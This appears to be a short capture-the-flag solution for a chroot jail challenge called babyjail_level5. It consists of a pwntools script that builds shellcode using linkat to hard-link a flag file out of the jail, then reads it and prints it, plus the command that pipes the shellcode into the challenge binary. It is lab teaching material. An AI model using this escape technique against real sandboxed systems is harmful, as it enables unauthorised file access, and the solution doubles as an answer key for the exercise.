linkat man says:   
```
man linkat
```
the scripts:   
```
from pwn import *
context(log_level = 'info', arch = 'amd64', os = 'linux')
shellcode=shellcraft.linkat(3, "../../flag", 4, "/flaga")
shellcode+=shellcraft.open("/flaga")
shellcode+=shellcraft.read(4, 0x13373e8, 0x100)
shellcode+=shellcraft.write(1, 0x13373e8, 0x100)
shellcode=asm(shellcode)
sys.stdout.buffer.write(shellcode)
```
python3 resolve.py | /challenge/babyjail_level5 /home/hacker
